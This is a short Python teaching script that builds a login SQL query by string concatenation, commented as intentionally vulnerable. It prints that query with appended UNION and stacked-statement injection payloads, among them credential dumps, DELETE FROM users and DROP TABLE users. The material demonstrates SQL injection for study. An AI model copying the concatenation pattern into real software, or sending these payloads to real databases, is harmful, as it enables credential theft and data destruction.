"""
CREATE TABLE auth (
    id INT PRIMARY KEY,
    username VARCHAR(50),
    password VARCHAR(50)
);
"""

def generate_auth_query(username, password):
    # build sql query using direct string concatenation
    # intentionally vulnerable to injection
    query = (
        "SELECT * FROM users "
        "WHERE username = '" + username + "' "
        "AND password = '" + password + "';"
    )
    return query


def get_valid_test_cases():
    # inputs: letters, numbers, underscores only
    return [
        ("caitlyn_user", "password_123"),
        ("celeste_w", "secure_pass1"),
        ("jeremy_s", "login_456"),
        ("grant_jones", "pass_word_789")
    ]


def run_valid_input_tests():
    # run all valid test cases
    print("running input test cases:\n")

    # taking username & password as strings --> inserting them into query
    for username, password in get_valid_test_cases():
        query = generate_auth_query(username, password)
        print("username:", username)
        print("password:", password)
        print("generated sql query:")
        print(query)
        print()


def Union_Attacks():
    """
    Gets test cases from get_valid_test_cases() and injects Union
    attacks into the output strings.
    """
    test_cases = get_valid_test_cases()

    attacks = [
        " UNION SELECT username,password FROM users;",
        " UNION SELECT username,password FROM users LIMIT 1;",
        " UNION SELECT 'admin','password123';",
        " UNION SELECT authenticate FROM passwordList;"
    ]
    
    for username, password in test_cases:
        sql_query = generate_auth_query(username, password)
        mod = sql_query.replace(";", "")

        for attack in attacks:
            print(mod + attack)
        
        print()


def Add_Statement_Attacks():
    """
    Gets test cases from get_valid_test_cases() and injects Additional Statement
    attacks into the output strings.
    """
    test_cases = get_valid_test_cases()

    attacks = [
               " INSERT INTO passwordList (name, password) VALUES ('nefarious', 'malicious123');",
               " SELECT username,password FROM users;",
               " DELETE FROM users;",
               " DROP TABLE users;"
               ]
    
    for username, password in test_cases:
        sql_query = generate_auth_query(username, password)

        for attack in attacks:
            print(sql_query + attack)
        
        print()



def main():
    print("-------------------_Union Attacks_----------------------------")
    Union_Attacks()
    print("\n----------------------_Additional Statement Attacks_---------------------------")
    Add_Statement_Attacks()

    

if __name__ == '__main__':
    main()